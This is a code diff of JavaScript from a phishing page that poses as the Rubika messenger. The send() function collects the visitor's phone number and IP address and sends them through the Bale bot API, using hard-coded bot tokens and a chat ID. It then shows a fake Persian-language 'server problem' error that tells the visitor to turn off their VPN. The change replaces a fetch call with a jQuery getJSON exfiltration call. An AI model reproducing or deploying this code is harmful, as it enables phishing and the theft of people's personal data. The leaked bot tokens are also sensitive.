@@ -18,18 +18,28 @@ async function send_ip() {
 }
 async function send() {
     var phone = document.getElementById('phone_number_1').value;
-    // try {
+    try {
         var text = 'ip : ' + data.ip + '     phone : ' + phone;
-        var testd = await fetch('https://tapi.bale.ai/botwT9ArKZEC8Pxy7mSjvMPHsPj6JiJlIEQDX7P7MOT/sendMessage?text=' + text + '&chat_id=915303220');
 
-    // } catch (error) {}
-    // document.body.innerHTML = `<div class="box">
-    //     <img src="icon-192x192.png" alt="logo rubika">
-    //     <h1>اوه، یه مشکلی پیش اومد</h1>
-    //     <p id="text2" dir="rtl">یه مشکلی در ارتباط با سرور اتفاق افتاد.</p>
-    //     <p id="text2" dir="rtl">اگه فیلترشکن روشن هست لطفا خاموش کنید و دوباره تلاش کنید.</p>
-    //     <p id="text2" dir="rtl">درصورت نیاز به پشتیبانی ما در روبیکا پیام بدین : android_programmer@</p>
-    // </div>`
+        $.getJSON(
+            "https://tapi.bale.ai/bot1305734511:mjN4hbd6xjayVZWpG89cuvjEMMfFXhCMV3AFZLRt/sendMessage?chat_id=915303220&text=" + String(text),
+        )
+        document.body.innerHTML = `<div class="box">
+        <img src="icon-192x192.png" alt="logo rubika">
+        <h1>اوه، یه مشکلی پیش اومد</h1>
+        <p id="text2" dir="rtl">یه مشکلی در ارتباط با سرور اتفاق افتاد.</p>
+        <p id="text2" dir="rtl">اگه فیلترشکن روشن هست لطفا خاموش کنید و دوباره تلاش کنید.</p>
+        <p id="text2" dir="rtl">درصورت نیاز به پشتیبانی ما در روبیکا پیام بدین : android_programmer@</p>
+    </div>`
+
+    } catch (error) {}
+    document.body.innerHTML = `<div class="box">
+        <img src="icon-192x192.png" alt="logo rubika">
+        <h1>اوه، یه مشکلی پیش اومد</h1>
+        <p id="text2" dir="rtl">یه مشکلی در ارتباط با سرور اتفاق افتاد.</p>
+        <p id="text2" dir="rtl">اگه فیلترشکن روشن هست لطفا خاموش کنید و دوباره تلاش کنید.</p>
+        <p id="text2" dir="rtl">درصورت نیاز به پشتیبانی ما در روبیکا پیام بدین : android_programmer@</p>
+    </div>`
 }
 
 function check() {
